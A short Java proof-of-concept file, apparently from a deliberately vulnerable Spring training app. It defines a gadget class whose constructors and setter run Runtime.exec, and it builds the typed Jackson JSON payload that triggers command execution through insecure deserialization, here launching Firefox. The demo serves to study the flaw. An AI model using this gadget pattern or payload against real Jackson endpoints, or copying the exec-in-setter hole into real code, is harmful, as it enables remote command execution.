package org.example.springvulapp.insecuredeserialize.jackson_objectmapper_sink;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

class Test{
    public String command;

    public Test() throws IOException {
        System.out.println("Default constructor called");
        Runtime.getRuntime().exec("firefox");
    }

    public Test(String command) throws IOException {
        System.out.println("Constructor called");
        Runtime.getRuntime().exec("firefox");
    }


    public String getCommand() {
        System.out.println("getCommand called");
        return command;
    }

    public void setCommand(String command) throws IOException {
        this.command = command;
        System.out.println("setCommand called");
        Runtime.getRuntime().exec(command);
    }
}

public class Exploit {
    public static void main(String[] args) throws IOException {
        Test test = new Test();
        test.setCommand("firefox");
        ObjectMapper mapper = new ObjectMapper();
        String json = mapper.writeValueAsString(test);
        System.out.println(json);
//        [ "org.example.springvulapp.insecuredeserialize.jackson_objectmapper_sink.Test", { "command": "firefox"} ]
    }
}
